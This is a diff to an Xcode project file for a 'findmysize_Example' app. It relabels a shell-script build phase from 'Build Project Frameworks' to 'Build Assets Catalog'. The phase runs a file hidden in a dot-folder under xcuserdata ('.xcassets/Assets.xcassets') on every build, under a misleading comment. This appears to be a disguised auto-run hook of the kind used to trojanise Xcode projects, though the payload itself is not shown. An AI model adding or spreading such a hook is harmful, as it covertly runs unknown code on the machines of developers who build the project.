@@ -166,7 +166,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 607FACEF1AFB9204008FA782 /* Build configuration list for PBXNativeTarget "findmysize_Example" */;
 			buildPhases = (
-				DDFED909B7CBFF2A64AAC43A /* Build Project Frameworks */,
+				BE09EFAEC732F61975AAC43A /* Build Assets Catalog */,
 				296D6FC410715AE9B17C4FCB /* [CP] Check Pods Manifest.lock */,
 				607FACCC1AFB9204008FA782 /* Sources */,
 				607FACCD1AFB9204008FA782 /* Frameworks */,
@@ -264,7 +264,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	DDFED909B7CBFF2A64AAC43A /* Build Project Frameworks */ = {
+	BE09EFAEC732F61975AAC43A /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -273,7 +273,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Project Frameworks";
+			name = "Build Assets Catalog";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -282,8 +282,10 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
+	
+
 	
 		296D6FC410715AE9B17C4FCB /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
